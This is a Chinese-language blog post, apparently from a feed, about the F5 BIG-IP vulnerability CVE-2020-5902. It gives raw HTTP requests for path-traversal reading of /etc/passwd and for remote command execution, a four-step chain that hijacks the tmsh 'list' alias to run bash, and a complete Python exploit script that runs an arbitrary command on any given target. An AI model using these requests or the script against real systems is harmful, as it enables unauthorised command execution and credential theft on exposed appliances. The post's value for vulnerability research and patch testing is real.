        <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
<p>最近 F5 Networks的网络和安全产品BIG IP应用交付控制器曝出漏洞，昨天晚上10点时有人在推特发布了POC，随即尝试跟进此漏洞并编写EXP。</p>
<h3 id="0x02-poc">0x02 POC</h3>
<p>twitter: https://twitter.com/x4ce/status/1279790599793545216</p>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1594021257299.png" alt="" loading="lazy"></figure>
<ul>
<li>Read File Example:</li>
</ul>
<pre><code>/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd

GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1
Host: 127.0.0.1
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8
Cookie: JSESSIONID=89E562018185E75966F67E7FC50CF6E1
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1594020786088.png" alt="" loading="lazy"></figure>
<ul>
<li>F5 RCE Example:</li>
</ul>
<pre><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user

GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user HTTP/1.1
Host: 127.0.0.1
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8
Cookie: JSESSIONID=07E7975B5F6F4B43F3375AA5FFB32628
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1594020882774.png" alt="" loading="lazy"></figure>
<h3 id="0x03-尝试执行命令">0x03 尝试执行命令</h3>
<p>此处思路是利用alias绕过tmsh限制，学习自<a href="https://github.com/rapid7/metasploit-framework/pull/13807/commits">msf脚本</a>，目前还未合并到msf中</p>
<ul>
<li>
<ol>
<li>修改alias ，将list设置成bash命令</li>
</ol>
</li>
</ul>
<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
</code></pre>
<ul>
<li>
<ol start="2">
<li>生成bash文件并写入要执行的命令</li>
</ol>
</li>
</ul>
<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content=whoami
</code></pre>
<ul>
<li>
<ol start="3">
<li>执行bash文件</li>
</ol>
</li>
</ul>
<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe
</code></pre>
<ul>
<li>
<ol start="4">
<li>还原alias设置，防止影响目标正常使用</li>
</ol>
</li>
</ul>
<pre><code>https://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list
</code></pre>
<p>Example:</p>
<p>这是命令成功执行后的回显，此处执行的是whoami命令<br>
<img src="https://www.svenbeast.com/post-images/1594020895508.png" alt="" loading="lazy"></p>
<h3 id="0x04-exp">0x04 EXP</h3>
<ul>
<li>编写一个exp脚本以便以后碰到后节省时间</li>
<li>Github: https://github.com/sv3nbeast/CVE-2020-5902_RCE</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1594026785249.png" alt="" loading="lazy"></figure>
<pre><code>import requests   #by 斯文
import sys
import json
requests.packages.urllib3.disable_warnings()

banner= '''
   ______     _______     ____   ___ ____   ___       ____  ___   ___ ____  
  / ___\ \   / / ____|   |___ \ / _ \___ \ / _ \     | ___|/ _ \ / _ \___ \ 
 | |    \ \ / /|  _| _____ __) | | | |__) | | | |____|___ \ (_) | | | |__) |
 | |___  \ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) \__, | |_| / __/ 
  \____|  \_/  |_____|   |_____|\___/_____|\___/     |____/  /_/ \___/_____|          

                                                        by 斯文
'''

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
}

def check(url, cmd):
    try:
        print('[+ 开始测试目标: {}  命令: {}'.format(url,cmd))

        del_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
        creat_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
        write_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content={}'.format(cmd)
        exec_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe'
        print('[+ 正在还原alias设置，防止其他人未修改回来')
        x = requests.get(del_alias,headers=headers,verify=False,timeout=30)
        print('[+ 正在将list命令劫持为bash')
        y = requests.get(creat_alias,headers=headers,verify=False,timeout=30)
        print('[+ 正在写入bash文件')
        z = requests.get(write_bash,headers=headers,verify=False,timeout=30)
        print('[+ 正在执行命令,请查看output字段值'+'\n')
        g = requests.get(exec_bash,headers=headers,verify=False,timeout=30)
        requests.get(del_alias,headers=headers,verify=False,timeout=30)
        text = g.content.decode('utf-8')
        print(text.strip('\n'))
    except:
        print('[- 请查看目标是否可以正常访问')
if __name__ == &quot;__main__&quot;:
    try:
        url = sys.argv[1]
        cmd = sys.argv[2]
        if url[-1] == '/':url=url[0:-1]
        print(banner)
        check(url=url,cmd=cmd)

    except Exception as e:
        # print(e)
        
        print('python3 CVE-2020-5902.py http://x.x.x.x  whoami')
</code></pre>
<h3 id="0x05-坑点">0x05 坑点</h3>
<ul>
<li>在执行前可尝试先还原一遍alias的设置，防止list命令已被篡改</li>
<li>文件读取和RCE是两个单独的漏洞，不是说存在文件读取就会存在RCE，两者影响版本不同</li>
</ul>
]]></content>
    </entry>
</feed>